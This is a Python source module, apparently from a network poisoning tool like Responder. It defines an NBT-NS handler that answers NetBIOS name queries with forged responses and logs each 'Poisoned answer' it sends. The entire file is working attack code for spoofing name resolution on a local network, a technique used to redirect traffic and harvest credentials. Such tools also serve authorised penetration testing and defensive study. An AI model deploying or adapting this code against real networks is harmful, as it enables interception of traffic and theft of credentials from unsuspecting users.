#!/usr/bin/env python
from socketserver import BaseRequestHandler
from ..packets import NBT_Ans
from ..utils import *

class NBTNS(BaseRequestHandler):

	def handle(self):
		try:
			data, socket = self.request
			Name = Decode_Name(RecvBuffer(data[13:45]))

			if data[2:4] == b'\x01\x10':
				Buffer1 = NBT_Ans()
				Buffer1.calculate(data)
				socket.sendto(SendBuffer(Buffer1), self.client_address)
				if not settings.Config.Quiet:
					print("[*] [NBT-NS] Poisoned answer sent to %s for name %s (service: %s)" % (self.client_address[0].replace("::ffff:",""), Name, NBT_NS_Role(RecvBuffer(data[43:46]))))

		except Exception as e:
			print(e)

